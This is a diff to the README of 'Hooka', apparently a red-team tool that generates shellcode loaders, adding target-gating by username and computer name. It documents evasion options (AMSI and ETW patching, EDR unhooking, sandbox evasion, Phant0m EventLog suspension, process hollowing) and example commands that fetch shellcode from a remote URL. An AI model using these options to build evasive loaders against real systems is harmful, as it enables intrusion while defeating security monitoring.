@@ -30,7 +30,7 @@
 
 # Introduction
 
-Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like [BokuLoader](https://github.com/boku7/BokuLoader), [Freeze](https://github.com/optiv/Freeze) or [Shhhloader](https://github.com/icyguider/Shhhloader), and it tries to implement more evasion features. Why in Golang? Why not?
+Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like [BokuLoader](https://github.com/boku7/BokuLoader), [Freeze](https://github.com/optiv/Freeze) or [Shhhloader](https://github.com/icyguider/Shhhloader), and it tries to implement more evasion features. Why in Golang? Although it's not the perfect language for malware dev, it works perfectly for testing purposes. Obviously if you want something professional and foolproof you should create your own loader in C++, C# or similars.
 
 # Features
 
@@ -57,6 +57,7 @@ This tool is able to generate loaders with this features:
 - Random variables and function names
 - Shikata Ga Nai obfuscation (see [here](https://github.com/EgeBalci/sgn))
 - Multiple ways to detect sandboxing
+- Check if username and computer name match before running
 - Enable ACG Guard protection
 - Block non-Microsoft signed DLLs from injecting into created processes
 
@@ -89,12 +90,6 @@ After that you will find the binary under the `build/` folder
 
 > Help panel
 ```
-  _   _                   _              _
- | | | |   ___     ___   | | __   __ _  | |
- | |_| |  / _ \   / _ \  | |/ /  / _` | | |
- |  _  | | (_) | | (_) | |   <  | (_| | |_|
- |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
-
 Usage of Hooka:
   REQUIRED:
     -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL
@@ -122,15 +117,17 @@ Usage of Hooka:
     --strings            obfuscate strings using Caesar cipher
 
   EVASION:
-    --unhook string       unhooking technique to use (available: full, peruns)
-    --sandbox             enable sandbox evasion
-    --no-amsi             don't patch AMSI
-    --no-etw              don't patch ETW
-    --hashing             use hashes to retrieve function pointers
-    --acg                 enable ACG Guard to prevent AV/EDR from modifying existing executable code
-    --blockdlls           prevent non-Microsoft signed DLLs from injecting in child processes
-    --phantom             suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
-    --sleep               delay shellcode execution using a custom sleep function
+    --unhook string         unhooking technique to use (available: full, peruns)
+    --sandbox               enable sandbox evasion
+    --no-amsi               don't patch AMSI
+    --no-etw                don't patch ETW
+    --hashing               use hashes to retrieve function pointers
+    --user string           proceed only when the user running the loader is the expected (i.e. DESKTOP-E1D6G0A\admin)
+    --computername string   proceed only when the computer name is the expected (i.e. DESKTOP-E1D6G0A)
+    --acg                   enable ACG Guard to prevent AV/EDR from modifying existing executable code
+    --blockdlls             prevent non-Microsoft signed DLLs from injecting in child processes
+    --phantom               suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
+    --sleep                 delay shellcode execution using a custom sleep function
 
   EXTRA:
     --calc              use a calc.exe shellcode to test loader capabilities (don't provide input file)
@@ -142,7 +139,7 @@ Usage of Hooka:
 Examples:
   hooka -i shellcode.bin -o loader.exe
   hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
-  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg
+  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
   hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 ```
 
@@ -161,6 +158,7 @@ $ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
 $ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
 $ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
 $ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
+$ hooka_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computername "DESKTOP-E1D6G0A" --compress --strings
 ```
 
 # Demo
@@ -171,10 +169,9 @@ $ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --doma
 
 # TODO
 
+- ~~Check username and hostname before running~~
 - Add direct and indirect syscall
 - Add Chacha20 cypher to encrypt shellcode
-- More OPSEC features
-- General improvement
 
 # Library
 
@@ -216,7 +213,7 @@ Use this project under your own responsability! The author is not responsible of
 
 This project is under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license
 
-Copyright © 2024, *D3Ext*
+Copyright © 2025, *D3Ext*
 
 
 
